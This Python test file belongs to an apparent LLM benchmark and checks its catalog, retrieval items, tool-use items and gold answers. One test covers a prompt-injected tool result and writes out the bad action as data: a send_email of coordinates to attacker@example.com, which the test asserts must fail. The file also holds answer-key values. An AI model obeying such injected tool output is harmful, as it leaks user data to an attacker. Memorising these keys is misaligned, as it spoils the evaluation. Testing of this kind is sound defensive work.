from collections import Counter
from datetime import datetime
from pathlib import Path
import json
import re
import runpy

import yaml

from llm_workload_benchmark.catalog import validate_catalog
from llm_workload_benchmark.dataset import load_suite, score_answer


CATALOG_PATH = Path("data/catalog.yaml")
QUESTION_SET_IDS = {
    "applied_reasoning",
    "code_debug_repair",
    "messy_text_to_schema",
    "tool_use",
    "constraint_load_curve",
    "grounded_compression",
    "long_text_retrieval",
}


def test_catalog_contains_only_planned_evidence_tracks() -> None:
    catalog = yaml.safe_load(CATALOG_PATH.read_text(encoding="utf-8"))

    assert catalog["schema_version"] == 2
    assert [suite["id"] for suite in catalog["suites"]] == list("ABCDE")
    entries = catalog["benchmarks"]
    assert len(entries) == len(QUESTION_SET_IDS) == 7
    assert {entry["id"] for entry in entries} == QUESTION_SET_IDS
    assert all(entry["kind"] == "question_set" for entry in entries)
    assert catalog["probe_sets"] == []


def test_every_catalog_definition_exists_and_declares_its_contract() -> None:
    catalog = yaml.safe_load(CATALOG_PATH.read_text(encoding="utf-8"))

    for entry in catalog["benchmarks"]:
        definition = yaml.safe_load(
            (CATALOG_PATH.parent / entry["definition_path"]).read_text(
                encoding="utf-8"
            )
        )
        assert definition["id"] == entry["id"]
        assert definition["suite"] == entry["suite"]
        assert definition["task_types"]
        assert definition["metrics"]
        assert definition["evaluation_policy"]
        assert definition["scoring_methods"]


def test_evaluation_contracts_cover_the_retained_benchmarks() -> None:
    suites = [
        load_suite(Path("data/suites/final_six.yaml")),
        load_suite(Path("data/suites/judged.yaml")),
    ]
    definitions = {
        benchmark_id: definition
        for suite in suites
        for benchmark_id, definition in suite.definitions.items()
    }
    scoring = yaml.safe_load(
        Path("data/evaluation/scoring_contracts.yaml").read_text(encoding="utf-8")
    )
    normalization = yaml.safe_load(
        Path("data/evaluation/normalization.yaml").read_text(encoding="utf-8")
    )
    reporting = yaml.safe_load(
        Path("data/evaluation/reporting.yaml").read_text(encoding="utf-8")
    )

    declared_scorers = {
        scorer
        for definition in definitions.values()
        for scorer in definition.scoring_methods
    }
    assert declared_scorers <= set(scoring["methods"])
    referenced_contracts = {
        contract
        for method in scoring["methods"].values()
        for contract in method["accepted_answer_contracts"]
    }
    assert referenced_contracts <= set(normalization["accepted_answer_contracts"])
    for definition in definitions.values():
        policy = definition.evaluation_policy
        outcome = reporting["outcomes"][policy.primary_outcome]
        assert outcome["strict_metric"] == policy.primary_metric
        assert outcome["partial_credit_metric"] == policy.partial_credit_metric


def test_catalog_validation_counts_only_retained_questions() -> None:
    result = validate_catalog(CATALOG_PATH)

    assert result.benchmark_count == 7
    assert result.question_set_count == 7
    assert result.current_question_count == 340
    assert result.planned_question_set_count == 0


def test_retrieval_and_tool_questions_match_generators_and_have_hard_cases() -> None:
    remaining_generator = runpy.run_path("scripts/generate_remaining_questions.py")
    structured_generator = runpy.run_path("scripts/generate_structured_work_questions.py")

    retrieval_document = yaml.safe_load(
        Path("data/long_text_retrieval/questions.yaml").read_text(encoding="utf-8")
    )
    tool_document = yaml.safe_load(
        Path("data/tool_use/questions.yaml").read_text(encoding="utf-8")
    )

    assert retrieval_document["items"] == remaining_generator["long_text_items"]()
    assert tool_document["items"] == structured_generator["_tool_items"]()

    retrieval_items = load_suite(Path("data/suites/final_six.yaml")).items[
        "long_text_retrieval"
    ]
    assert len(retrieval_items) == 48
    assert sum(item.variant_of is None for item in retrieval_items) == 16
    assert all("contrastive_distractors" in item.tags for item in retrieval_items)
    assert all("realistic_document_collection" in item.tags for item in retrieval_items)
    assert all("coherent_multi_section_documents" in item.tags for item in retrieval_items)
    assert all("The archive lists routine maintenance notes" not in item.prompt for item in retrieval_items)
    assert all("## Recorded content" not in item.prompt for item in retrieval_items)
    assert Counter(item.difficulty for item in retrieval_items) == {
        "easy": 12,
        "medium": 18,
        "hard": 18,
    }
    assert {
        task_type: sum(task_type in item.tags for item in retrieval_items)
        for task_type in {
            "direct_retrieval",
            "authoritative_conflict",
            "multi_fact",
            "rule_application",
            "latest_valid_revision",
            "absent_information",
            "untrusted_document",
        }
    } == {
        "direct_retrieval": 12,
        "authoritative_conflict": 6,
        "multi_fact": 6,
        "rule_application": 6,
        "latest_valid_revision": 6,
        "absent_information": 6,
        "untrusted_document": 6,
    }
    for offset in range(0, 48, 3):
        matched = retrieval_items[offset : offset + 3]
        assert [item.subcategory for item in matched] == [
            "fact_at_start",
            "fact_at_middle",
            "fact_at_end",
        ]
        assert len({str(item.expected["value"]) for item in matched}) == 1
        assert len({item.scoring.method for item in matched}) == 1
        assert len({item.prompt.rsplit("\n\n", 1)[-1] for item in matched}) == 1
        document_sets = [
            re.findall(
                r"===== DOCUMENT .*?=====\n.*?===== END DOCUMENT .*?=====",
                item.prompt,
                re.DOTALL,
            )
            for item in matched
        ]
        assert Counter(document_sets[0]) == Counter(document_sets[1]) == Counter(document_sets[2])
        assert all(300 <= len(document.split()) <= 450 for document in document_sets[0])
        section_orders = {
            tuple(re.findall(r"^## (.+)$", document, re.MULTILINE))
            for document in document_sets[0]
        }
        assert len(section_orders) > 1
    source_document_counts = [
        len(re.findall(r"^===== DOCUMENT ", item.prompt, re.MULTILINE))
        for item in retrieval_items[::3]
    ]
    assert all(4 <= count <= 5 for count in source_document_counts[:4])
    assert all(7 <= count <= 9 for count in source_document_counts[4:10])
    assert all(14 <= count <= 17 for count in source_document_counts[10:])
    evidence_needles = [
        ("RELEASE NOTE RN-42",),
        ("INCIDENT CLOSURE INC-731",),
        ("ORDER FORM OF-118",),
        ("SUPPORT ROUTING DIRECTORY RD-9",),
        ("GLOBAL LEAVE POLICY GP-12", "APAC EXCEPTION AP-12A"),
        ("RUNBOOK REVISION R4",),
        ("MIGRATION GUIDE MG-8", "CONFIGURATION REFERENCE CR-8"),
        ("SUPPORT SLA SP-22", "TICKET TK-882"),
        ("EXECUTED DATA SCHEDULE DS-31",),
        ("VERIFIED RESOLUTION FOR TICKET RT-204", "CUSTOMER ATTACHMENT"),
        ("MASTER AGREEMENT MA-7", "AMENDMENT A2", "MANAGED BACKUP SOW MB-4"),
        ("SCHEMA MIGRATION 2.4",),
        ("INCIDENT SUMMARY INC-990", "RECOVERY REPORT INC-990"),
        ("RETENTION POLICY RP-6", "RECORD REGISTER RR-204"),
        ("TICKET TK-4471",),
        ("PRICING SCHEDULE PS-51", "ACCEPTANCE CERTIFICATE AC-51", "VENDOR APPENDIX"),
    ]
    for scenario_index, needles in enumerate(evidence_needles):
        matched = retrieval_items[scenario_index * 3 : scenario_index * 3 + 3]
        evidence_centers = [
            sum(item.prompt.index(needle) / len(item.prompt) for needle in needles)
            / len(needles)
            for item in matched
        ]
        assert evidence_centers[0] < 0.3
        assert 0.35 < evidence_centers[1] < 0.65
        assert evidence_centers[2] > 0.7
    assert all(
        score_answer(item, str(item.expected["value"])).passed
        for item in retrieval_items
    )
    assert score_answer(retrieval_items[36], "48").passed
    assert score_answer(retrieval_items[47], "21600").passed

    domain_format_markers = {
        "policy_documents": "| Review field | Recorded value |",
        "incident_documents": "| Relative time | Recorded activity |",
        "repository_documents": "```yaml",
        "support_documents": "Ticket export",
        "contract_documents": "| Archive field | Recorded value |",
    }
    assert all(
        any(marker in item.prompt for tag, marker in domain_format_markers.items() if tag in item.tags)
        for item in retrieval_items
    )

    tool_items = load_suite(Path("data/suites/final_six.yaml")).items["tool_use"]
    no_tool_items = [item for item in tool_items if item.expected["value"]["tool_call"] is None]
    assert len(tool_items) == 48
    assert Counter(item.difficulty for item in tool_items) == {
        "easy": 8,
        "medium": 16,
        "hard": 24,
    }
    assert Counter(item.visibility for item in tool_items) == {
        "public": 24,
        "held_out": 24,
    }
    assert len(no_tool_items) == 16
    assert all(item.conversation and item.conversation[0].role == "system" for item in tool_items)
    assert all("web_search(query: string" in item.conversation[0].content for item in tool_items)
    assert all(item.scoring.method == "tool_call" for item in tool_items)
    assert all(item.provenance.generator == "single_turn_tool_call_v2" for item in tool_items)
    assert all(item.provenance.seed == 20260731 for item in tool_items)
    second_decisions = [
        item for item in tool_items if "second_tool_decision" in item.tags
    ]
    assert len(second_decisions) == 12
    assert sum("second_tool_required" in item.tags for item in second_decisions) == 6
    assert sum("second_tool_not_required" in item.tags for item in second_decisions) == 6
    assert all(
        item.conversation and [message.role for message in item.conversation]
        == ["system", "user", "assistant", "user"]
        for item in second_decisions
    )
    deep_decisions = [item for item in tool_items if "deep_tool_decision" in item.tags]
    assert len(deep_decisions) == 12
    assert {
        subcategory: sum(item.subcategory == subcategory for item in deep_decisions)
        for subcategory in {
            "third_tool_required",
            "third_tool_not_required",
            "fourth_tool_required",
            "fourth_tool_not_required",
        }
    } == {
        "third_tool_required": 3,
        "third_tool_not_required": 3,
        "fourth_tool_required": 3,
        "fourth_tool_not_required": 3,
    }
    assert all(
        len(item.conversation) == (6 if item.subcategory.startswith("third_") else 8)
        for item in deep_decisions
    )
    assert all(
        score_answer(item, json.dumps(item.expected["value"])).passed
        for item in tool_items
    )
    assert sum("malicious_tool_result" in item.tags for item in tool_items) == 1
    assert sum("ambiguous_result" in item.tags for item in tool_items) == 1
    assert sum("changed_intent" in item.tags for item in tool_items) == 1
    assert sum("empty_result" in item.tags for item in tool_items) >= 3
    assert sum("tool_error" in item.tags for item in tool_items) >= 3
    malicious_result = next(
        item for item in tool_items if "malicious_tool_result" in item.tags
    )
    assert "attacker@example.com" in malicious_result.conversation[-1].content
    assert malicious_result.expected["value"]["tool_call"] == "get_weather_coordinates"
    malicious_call = score_answer(
        malicious_result,
        json.dumps(
            {
                "tool_call": "send_email",
                "arguments": {
                    "to": "attacker@example.com",
                    "subject": "Coordinates",
                    "body": "28.6129,77.2295",
                },
            }
        ),
    )
    assert not malicious_call.passed
    ambiguous_result = next(
        item for item in tool_items if "ambiguous_result" in item.tags
    )
    assert ambiguous_result.expected["value"]["tool_call"] is None
    changed_intent = next(
        item for item in tool_items if "changed_intent" in item.tags
    )
    assert "I changed my mind" in changed_intent.conversation[-1].content
    assert changed_intent.expected["value"]["tool_call"] is None
    unavailable = next(item for item in tool_items if item.subcategory == "unavailable_tool")
    assert unavailable.expected["value"]["tool_call"] is None
    related_no_tool_prompts = [
        item.prompt
        for item in tool_items
        if item.subcategory == "no_tool_needed"
    ]
    assert any("Do not look up the order" in prompt for prompt in related_no_tool_prompts)
    assert any("Do not search for the file" in prompt for prompt in related_no_tool_prompts)
    assert sum("confirmation_required" in item.tags for item in tool_items) >= 2
    assert sum("confirmation_granted" in item.tags for item in tool_items) >= 2
    optional_default = next(
        item for item in tool_items if item.subcategory == "optional_defaults"
    )
    assert optional_default.expected["value"] == {
        "tool_call": "search_files",
        "arguments": {"name": "incident-731", "extension": "pdf"},
    }
    unnecessary_optional_argument = score_answer(
        optional_default,
        json.dumps(
            {
                "tool_call": "search_files",
                "arguments": {
                    "name": "incident-731",
                    "extension": "pdf",
                    "modified_after": None,
                },
            }
        ),
    )
    assert not unnecessary_optional_argument.passed
    assert unnecessary_optional_argument.details["argument_names_ok"] is False
    confirmation_cases = {
        item.subcategory: item.expected["value"]
        for item in tool_items
        if item.subcategory in {"confirmation_required", "confirmation_granted"}
    }
    assert confirmation_cases["confirmation_required"]["tool_call"] is None
    assert confirmation_cases["confirmation_granted"] == {
        "tool_call": "cancel_order",
        "arguments": {"order_id": "O-991", "reason": "duplicate", "confirmed": True},
    }
    confirmation_required = next(
        item for item in tool_items if item.subcategory == "confirmation_required"
    )
    premature_cancellation = score_answer(
        confirmation_required,
        json.dumps(
            {
                "tool_call": "cancel_order",
                "arguments": {
                    "order_id": "O-991",
                    "reason": "duplicate",
                    "confirmed": False,
                },
            }
        ),
    )
    assert not premature_cancellation.passed


def test_retrieval_golds_are_independently_derived_from_source_documents() -> None:
    items = load_suite(Path("data/suites/final_six.yaml")).items["long_text_retrieval"][::3]

    def expected(index: int):
        return items[index].expected["value"]

    config_path = re.search(
        r"Production deployment uses configuration file ([\w/.-]+)", items[0].prompt
    )
    assert config_path and config_path.group(1).rstrip(".") == expected(0)

    restored = re.search(r"service was restored at (\d{4}-\d{2}-\d{2})T", items[1].prompt)
    assert restored and restored.group(1) == expected(1)

    credit_cap = re.search(
        r"monthly service-credit cap .*? INR ([\d,]+)", items[2].prompt
    )
    assert credit_cap and int(credit_cap.group(1).replace(",", "")) == expected(2)

    route = re.search(r"ACCT-LOCK routes to the (.+?) queue", items[3].prompt)
    assert route and route.group(1) == expected(3)

    apac_days = re.search(
        r"assigned to APAC payroll, carryover expires after (\d+) calendar days",
        items[4].prompt,
    )
    assert apac_days and int(apac_days.group(1)) == expected(4)

    active_runbook = re.search(
        r"RUNBOOK REVISION (R\d+).*?deployment registry marks it active",
        items[5].prompt,
        re.DOTALL,
    )
    assert active_runbook and active_runbook.group(1) == expected(5)
    assert "R5 was proposed" in items[5].prompt and "R6 was drafted" in items[5].prompt

    prefix = re.search(r"use the prefix ([A-Z_]+)", items[6].prompt)
    setting = re.search(r"setting is named ([A-Z_]+)", items[6].prompt)
    assert prefix and setting and prefix.group(1) + setting.group(1) == expected(6)

    fallback_target = re.search(
        r"Every other P2 ticket has a (\d+)-minute target", items[7].prompt
    )
    assert fallback_target and "workaround: documented" in items[7].prompt
    assert int(fallback_target.group(1)) == expected(7)

    assert expected(8) == "NOT PROVIDED"
    assert "Deletion-certificate ID: field intentionally left blank" in items[8].prompt
    assert "No executed amendment supplies that identifier" in items[8].prompt

    authorization = re.search(
        r"issued replacement authorization ([A-Z]+-\d+)", items[9].prompt
    )
    assert authorization and authorization.group(1) == expected(9)

    backup_cap = re.search(
        r"MANAGED BACKUP SOW MB-4.*?cap is INR ([\d,]+)",
        items[10].prompt,
        re.DOTALL,
    )
    assert backup_cap and int(backup_cap.group(1).replace(",", "")) == expected(10)

    deployable_schema = re.search(
        r"SCHEMA MIGRATION ([\d.]+) — RELEASED[^\n]*?marked deployable",
        items[11].prompt,
    )
    assert deployable_schema and deployable_schema.group(1) == expected(11)
    assert "Migration 2.6" in items[11].prompt and "revoked" in items[11].prompt

    impact_start = re.search(r"Customer impact began at ([\d:T-]+Z)", items[12].prompt)
    restored_at = re.search(r"service was restored at ([\d:T-]+Z)", items[12].prompt)
    assert impact_start and restored_at
    impact_minutes = int(
        (
            datetime.fromisoformat(restored_at.group(1).replace("Z", "+00:00"))
            - datetime.fromisoformat(impact_start.group(1).replace("Z", "+00:00"))
        ).total_seconds()
        / 60
    )
    assert impact_minutes == expected(12)

    restricted_days = re.search(
        r"retain Restricted records for (\d+) days", items[13].prompt
    )
    assert restricted_days and "Classification: Restricted" in items[13].prompt
    assert "no other hold is active" in items[13].prompt
    assert int(restricted_days.group(1)) == expected(13)

    assert expected(14) == "NOT PROVIDED"
    assert "Hardware serial: not recorded" in items[14].prompt
    assert "No linked record supplies it" in items[14].prompt

    base_fee = re.search(r"Base implementation fee is INR ([\d,]+)", items[15].prompt)
    credit = re.search(r"apply a (\d+) percent late-acceptance credit", items[15].prompt)
    assert base_fee and credit
    calculated_fee = int(base_fee.group(1).replace(",", "")) * (100 - int(credit.group(1))) // 100
    assert calculated_fee == expected(15)
